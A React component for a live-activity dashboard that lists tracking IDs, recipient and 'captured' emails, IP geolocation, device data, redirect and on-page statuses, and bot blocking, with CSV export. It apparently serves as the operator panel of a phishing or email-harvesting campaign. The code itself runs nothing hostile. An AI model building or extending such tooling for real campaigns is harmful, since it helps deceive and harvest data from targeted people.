import React, { useState, useEffect } from 'react';
import { Activity, Search, Filter, RefreshCw, Download, Eye, Globe, Shield, Clock, Mail, MapPin } from 'lucide-react';

const LiveActivity = () => {
  const [events, setEvents] = useState([]);
  const [filteredEvents, setFilteredEvents] = useState([]);
  const [searchTerm, setSearchTerm] = useState('');
  const [filterType, setFilterType] = useState('all');
  const [autoRefresh, setAutoRefresh] = useState(true);
  const [isLoading, setIsLoading] = useState(false);

  useEffect(() => {
    fetchEvents();
  }, []);

  useEffect(() => {
    if (autoRefresh) {
      const interval = setInterval(() => {
        fetchEvents();
      }, 5000); // Refresh every 5 seconds
      return () => clearInterval(interval);
    }
  }, [autoRefresh]);

  useEffect(() => {
    filterEvents();
  }, [events, searchTerm, filterType]);

  const fetchEvents = async () => {
    setIsLoading(true);
    try {
      const response = await fetch('/api/live-activity');
      if (response.ok) {
        const data = await response.json();
        if (data.success) {
          setEvents(data.events || []);
        } else {
          console.error('API returned error:', data.error);
          setEvents([]);
        }
      } else {
        console.error('Failed to fetch events:', response.status);
        setEvents([]);
      }
    } catch (error) {
      console.error('Error fetching events:', error);
      setEvents([]);
    }
    setIsLoading(false);
  };

  const filterEvents = () => {
    let filtered = events;

    // Apply search filter
    if (searchTerm) {
      filtered = filtered.filter(event =>
        event.tracking_id.toLowerCase().includes(searchTerm.toLowerCase()) ||
        event.ip_address.includes(searchTerm) ||
        event.recipient_email?.toLowerCase().includes(searchTerm.toLowerCase()) ||
        event.captured_email?.toLowerCase().includes(searchTerm.toLowerCase()) ||
        event.country.toLowerCase().includes(searchTerm.toLowerCase()) ||
        event.city.toLowerCase().includes(searchTerm.toLowerCase())
      );
    }

    // Apply type filter
    if (filterType !== 'all') {
      filtered = filtered.filter(event => {
        switch (filterType) {
          case 'opened':
            return event.email_opened;
          case 'redirected':
            return event.redirected;
          case 'on_page':
            return event.on_page;
          case 'blocked':
            return event.status === 'blocked';
          case 'bots':
            return event.is_bot;
          default:
            return true;
        }
      });
    }

    setFilteredEvents(filtered);
  };

  const exportData = () => {
    const csvContent = [
      ['Timestamp', 'Tracking ID', 'Recipient Email', 'Captured Email', 'IP Address', 'Country', 'City', 'ISP', 'Device', 'Status', 'Detailed Status'].join(','),
      ...filteredEvents.map(event => [
        event.timestamp,
        event.tracking_id,
        event.recipient_email || '',
        event.captured_email || '',
        event.ip_address,
        event.country,
        event.city,
        event.isp,
        event.device_type,
        event.status,
        event.detailed_status
      ].join(','))
    ].join('\n');

    const blob = new Blob([csvContent], { type: 'text/csv' });
    const url = window.URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `live-activity-${new Date().toISOString().split('T')[0]}.csv`;
    a.click();
    window.URL.revokeObjectURL(url);
  };

  const getStatusColor = (status, detailedStatus) => {
    switch (status) {
      case 'blocked':
        return 'text-red-400 bg-red-900/20';
      case 'active':
        return detailedStatus === 'On Page' ? 'text-green-400 bg-green-900/20' : 'text-blue-400 bg-blue-900/20';
      case 'redirected':
        return 'text-yellow-400 bg-yellow-900/20';
      case 'opened':
        return 'text-purple-400 bg-purple-900/20';
      default:
        return 'text-gray-400 bg-gray-900/20';
    }
  };

  const getThreatLevelColor = (level) => {
    switch (level) {
      case 'high':
        return 'text-red-400';
      case 'medium':
        return 'text-yellow-400';
      case 'low':
        return 'text-green-400';
      default:
        return 'text-gray-400';
    }
  };

  return (
    <div className="space-y-6">
      {/* Header */}
      <div className="flex flex-col sm:flex-row justify-between items-start sm:items-center gap-4">
        <div>
          <h2 className="text-2xl font-bold text-white mb-2 flex items-center gap-2">
            <Activity className="w-6 h-6" />
            Live Activity
          </h2>
          <p className="text-gray-400">Real-time tracking events and user interactions</p>
        </div>
        <div className="flex items-center gap-2">
          <label className="flex items-center gap-2 text-sm text-gray-300">
            <input
              type="checkbox"
              checked={autoRefresh}
              onChange={(e) => setAutoRefresh(e.target.checked)}
              className="rounded bg-gray-700 border-gray-600 text-blue-600 focus:ring-blue-500"
            />
            Auto-refresh
          </label>
          <button
            onClick={fetchEvents}
            disabled={isLoading}
            className="flex items-center gap-2 px-3 py-2 bg-gray-700 hover:bg-gray-600 text-white rounded-lg transition-colors disabled:opacity-50"
          >
            <RefreshCw className={`w-4 h-4 ${isLoading ? 'animate-spin' : ''}`} />
            Refresh
          </button>
        </div>
      </div>

      {/* Search and Filter */}
      <div className="flex flex-col sm:flex-row gap-4">
        <div className="relative flex-1">
          <Search className="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400 w-4 h-4" />
          <input
            type="text"
            placeholder="Search by tracking ID, IP, email, country..."
            value={searchTerm}
            onChange={(e) => setSearchTerm(e.target.value)}
            className="w-full pl-10 pr-4 py-2 bg-gray-800 border border-gray-700 rounded-lg text-white placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-blue-500"
          />
        </div>
        <select
          value={filterType}
          onChange={(e) => setFilterType(e.target.value)}
          className="px-4 py-2 bg-gray-800 border border-gray-700 rounded-lg text-white focus:outline-none focus:ring-2 focus:ring-blue-500"
        >
          <option value="all">All Events</option>
          <option value="opened">Email Opened</option>
          <option value="redirected">Redirected</option>
          <option value="on_page">On Page</option>
          <option value="blocked">Blocked</option>
          <option value="bots">Bot Traffic</option>
        </select>
        <button
          onClick={exportData}
          className="flex items-center gap-2 px-4 py-2 bg-blue-600 hover:bg-blue-700 text-white rounded-lg transition-colors"
        >
          <Download className="w-4 h-4" />
          Export
        </button>
      </div>

      {/* Events Table */}
      <div className="bg-gray-800 rounded-lg border border-gray-700 overflow-hidden">
        <div className="overflow-x-auto">
          <table className="w-full">
            <thead className="bg-gray-900">
              <tr>
                <th className="px-4 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">
                  <Clock className="w-4 h-4 inline mr-1" />
                  Timestamp
                </th>
                <th className="px-4 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">
                  Tracking ID
                </th>
                <th className="px-4 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">
                  <Mail className="w-4 h-4 inline mr-1" />
                  Recipient Email
                </th>
                <th className="px-4 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">
                  Captured Data
                </th>
                <th className="px-4 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">
                  IP Address
                </th>
                <th className="px-4 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">
                  <MapPin className="w-4 h-4 inline mr-1" />
                  Location
                </th>
                <th className="px-4 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">
                  ISP
                </th>
                <th className="px-4 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">
                  Device
                </th>
                <th className="px-4 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">
                  Status
                </th>
                <th className="px-4 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">
                  <Shield className="w-4 h-4 inline mr-1" />
                  Threat
                </th>
              </tr>
            </thead>
            <tbody className="divide-y divide-gray-700">
              {filteredEvents.map((event) => (
                <tr key={event.id} className="hover:bg-gray-700/50 transition-colors">
                  <td className="px-4 py-3 text-sm text-gray-300">
                    {new Date(event.timestamp).toLocaleString()}
                  </td>
                  <td className="px-4 py-3">
                    <code className="text-sm bg-gray-900 px-2 py-1 rounded text-blue-400">
                      {event.tracking_id}
                    </code>
                  </td>
                  <td className="px-4 py-3 text-sm text-gray-300">
                    {event.recipient_email ? (
                      <div className="flex items-center gap-1">
                        <Mail className="w-3 h-3 text-blue-400" />
                        <span className="truncate max-w-[150px]" title={event.recipient_email}>
                          {event.recipient_email}
                        </span>
                      </div>
                    ) : (
                      <span className="text-gray-500">-</span>
                    )}
                  </td>
                  <td className="px-4 py-3 text-sm text-gray-300">
                    {event.captured_email ? (
                      <div className="flex items-center gap-1">
                        <Eye className="w-3 h-3 text-green-400" />
                        <span className="truncate max-w-[120px]" title={event.captured_email}>
                          {event.captured_email}
                        </span>
                      </div>
                    ) : (
                      <span className="text-gray-500">None</span>
                    )}
                  </td>
                  <td className="px-4 py-3">
                    <code className="text-sm text-gray-300">{event.ip_address}</code>
                  </td>
                  <td className="px-4 py-3 text-sm text-gray-300">
                    <div className="flex items-center gap-1">
                      <img
                        src={`https://flagcdn.com/16x12/${event.country_code.toLowerCase()}.png`}
                        alt={event.country}
                        className="w-4 h-3"
                      />
                      <span>{event.city}, {event.country}</span>
                    </div>
                    {event.zip_code && (
                      <div className="text-xs text-gray-500">{event.zip_code}</div>
                    )}
                  </td>
                  <td className="px-4 py-3 text-sm text-gray-300">
                    <div>{event.isp}</div>
                    {event.organization && (
                      <div className="text-xs text-gray-500">{event.organization}</div>
                    )}
                  </td>
                  <td className="px-4 py-3 text-sm text-gray-300">
                    <div>{event.device_type}</div>
                    <div className="text-xs text-gray-500">
                      {event.browser} {event.browser_version}
                    </div>
                  </td>
                  <td className="px-4 py-3">
                    <span className={`inline-flex items-center px-2 py-1 rounded-full text-xs font-medium ${getStatusColor(event.status, event.detailed_status)}`}>
                      {event.detailed_status}
                    </span>
                    {event.blocked_reason && (
                      <div className="text-xs text-red-400 mt-1">{event.blocked_reason}</div>
                    )}
                  </td>
                  <td className="px-4 py-3 text-sm">
                    <div className={`flex items-center gap-1 ${getThreatLevelColor(event.threat_level)}`}>
                      <Shield className="w-3 h-3" />
                      <span className="capitalize">{event.threat_level}</span>
                    </div>
                    {event.is_bot && (
                      <div className="text-xs text-orange-400">Bot ({Math.round(event.bot_score * 100)}%)</div>
                    )}
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      </div>

      {/* Summary Stats */}
      <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4">
        <div className="bg-gray-800 rounded-lg p-4 border border-gray-700">
          <div className="flex items-center gap-2 mb-2">
            <Activity className="w-4 h-4 text-blue-400" />
            <span className="text-sm text-gray-400">Total Events</span>
          </div>
          <div className="text-2xl font-bold text-white">{filteredEvents.length}</div>
        </div>
        
        <div className="bg-gray-800 rounded-lg p-4 border border-gray-700">
          <div className="flex items-center gap-2 mb-2">
            <Mail className="w-4 h-4 text-green-400" />
            <span className="text-sm text-gray-400">Emails Captured</span>
          </div>
          <div className="text-2xl font-bold text-white">
            {filteredEvents.filter(e => e.captured_email).length}
          </div>
        </div>
        
        <div className="bg-gray-800 rounded-lg p-4 border border-gray-700">
          <div className="flex items-center gap-2 mb-2">
            <Shield className="w-4 h-4 text-red-400" />
            <span className="text-sm text-gray-400">Blocked</span>
          </div>
          <div className="text-2xl font-bold text-white">
            {filteredEvents.filter(e => e.status === 'blocked').length}
          </div>
        </div>
        
        <div className="bg-gray-800 rounded-lg p-4 border border-gray-700">
          <div className="flex items-center gap-2 mb-2">
            <Globe className="w-4 h-4 text-purple-400" />
            <span className="text-sm text-gray-400">Countries</span>
          </div>
          <div className="text-2xl font-bold text-white">
            {new Set(filteredEvents.map(e => e.country)).size}
          </div>
        </div>
      </div>
    </div>
  );
};

export default LiveActivity;
export { LiveActivity };

